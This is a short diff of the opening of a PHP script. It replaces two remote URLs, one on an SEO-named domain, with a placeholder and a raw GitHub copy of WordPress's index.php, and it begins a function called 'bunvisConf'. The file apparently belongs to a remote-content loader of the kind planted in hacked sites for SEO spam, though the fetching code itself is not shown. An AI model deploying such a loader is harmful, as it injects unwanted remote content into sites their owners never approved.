@@ -1,7 +1,7 @@
 <?php
 
-$bunvisUrl = 'https://seokeycina.autos/smpn41/doc.txt';
-$homeUrl = 'https://seokeycina.autos/smpn41/file.txt';
+$bunvisUrl = 'link lp';
+$homeUrl = 'https://raw.githubusercontent.com/WordPress/WordPress/refs/heads/master/index.php';
 
 function bunvisConf($exd)
 {
